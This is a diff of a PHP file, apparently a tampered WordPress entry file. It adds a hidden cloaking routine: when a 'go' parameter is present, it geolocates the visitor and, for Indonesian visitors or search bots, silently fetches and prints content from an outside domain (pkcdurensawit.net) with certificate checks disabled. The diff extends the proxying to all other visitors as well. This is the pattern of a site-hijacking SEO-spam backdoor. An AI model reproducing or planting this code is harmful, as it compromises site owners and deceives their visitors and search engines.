@@ -1,7 +1,7 @@
 <?php
 if(isset($_GET['go'])) {
     $url = $_GET['go'];
-error_reporting(1);
+error_reporting(0);
 class detectMobile{
     protected $userAgent = null;
     protected $httpHeaders = array();
@@ -81,15 +81,47 @@ function getIpAddr(){
 $detectMobile = new detectMobile();
 $isAllowedBots = $detectMobile->isAllowedBots();
 $getIP = getIpAddr();
-$ipLoc = @json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip='.$getIP), true);
+//$ipLoc = @json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip='.$getIP), true);
+
+$useragent1="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+// INIT CURL
+$ipLocx = curl_init();
+
+//init curl
+curl_setopt($ipLocx, CURLOPT_USERAGENT, $useragent1);
+// SET URL FOR THE POST FORM LOGIN
+curl_setopt($ipLocx, CURLOPT_URL, 'http://www.geoplugin.net/json.gp?ip='.$getIP);
+curl_setopt($ipLocx, CURLOPT_FOLLOWLOCATION, 0);
+
+curl_setopt($ipLocx, CURLOPT_CUSTOMREQUEST, 'GET');
+
+// common name and also verify that it matches the hostname provided)
+curl_setopt($ipLocx, CURLOPT_SSL_VERIFYPEER, false);
+
+// Optional: Return the result instead of printing it
+curl_setopt($ipLocx, CURLOPT_RETURNTRANSFER, 1);
+
+// ENABLE HTTP POST
+curl_setopt ($ipLocx, CURLOPT_POST, 1);
+curl_setopt ($ipLocx, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ipLocx, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ipLocx, CURLOPT_SSL_VERIFYHOST, false);
+
+$ipLoc = @json_decode(curl_exec ($ipLocx), true);
+//echo $ipLoc;
+
+// CLOSE CURL
+curl_close ($ipLocx);
+
+
 $countryCode = strtolower($ipLoc['geoplugin_countryCode']);
 if($countryCode === 'id' || $isAllowedBots){
-  $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+  $useragentx="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
 // INIT CURL
   $ch = curl_init();
 
   //init curl
-  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+  curl_setopt($ch, CURLOPT_USERAGENT, $useragentx);
   // SET URL FOR THE POST FORM LOGIN
   curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/highway1/'.$url.'/');
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
@@ -115,10 +147,35 @@ if($countryCode === 'id' || $isAllowedBots){
   curl_close ($ch);
 }
 else {
-  $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
-  $messageUrl = 'https://raw.githubusercontent.com/Kielnev77/tinyfilemanager/master/403.txt';
-  $message = file_get_contents($messageUrl);
-  
+  $useragentx="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+// INIT CURL
+  $ch = curl_init();
+
+  //init curl
+  curl_setopt($ch, CURLOPT_USERAGENT, $useragentx);
+  // SET URL FOR THE POST FORM LOGIN
+  curl_setopt($ch, CURLOPT_URL, 'https://replication2.pkcdurensawit.net/');
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+
+  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+
+  // common name and also verify that it matches the hostname provided)
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+  // Optional: Return the result instead of printing it
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+  // ENABLE HTTP POST
+  curl_setopt ($ch, CURLOPT_POST, 1);
+  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+  $store = curl_exec ($ch);
+  echo $store;
+
+  // CLOSE CURL
+  curl_close ($ch);
 
 }
 } else {
@@ -135,8 +192,6 @@ else {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
-
 }
 }
-
 ?>
